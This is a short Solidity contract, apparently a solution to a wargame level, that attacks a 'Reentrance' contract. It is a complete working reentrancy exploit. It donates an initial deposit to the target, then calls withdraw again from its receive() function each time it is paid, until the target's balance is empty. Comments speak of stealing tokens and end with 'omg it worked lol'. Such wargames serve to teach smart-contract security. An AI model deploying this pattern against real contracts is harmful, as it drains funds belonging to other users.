pragma solidity ^0.8.0;

import './Reentrance.sol';

contract ReentranceHack {

    address instanceAddr = INSTANCE_ADDR_HERE;
    Reentrance public target;
    uint256 initDeposit;

    constructor() public payable {
        target = Reentrance(payable(instanceAddr));
    }

    function attack() external payable {
        require(msg.value >= 0.01 ether);

        //deposit some funds to dontae
        initDeposit = msg.value;
        target.donate{value: initDeposit}(address(this)); 
        //recursively call the withdraw function until contract is empty
        callWithdraw();
    }
    receive() external payable {
        callWithdraw();
    }
   
    function callWithdraw() private {
        //update remaining balance for each withdraw
        uint256 remainingBal = address(target).balance;
        //check if there are more tokens to steal
        bool continueRecursing = remainingBal > 0;

        if(continueRecursing) {
            //we're only allowed to withdraw at most our initial deposit
            uint256 withdrawAmt = 
                initDeposit < remainingBal
                    ? initDeposit
                    : remainingBal;
                target.withdraw(withdrawAmt);
        }   
    }
}

//omg it worked lol
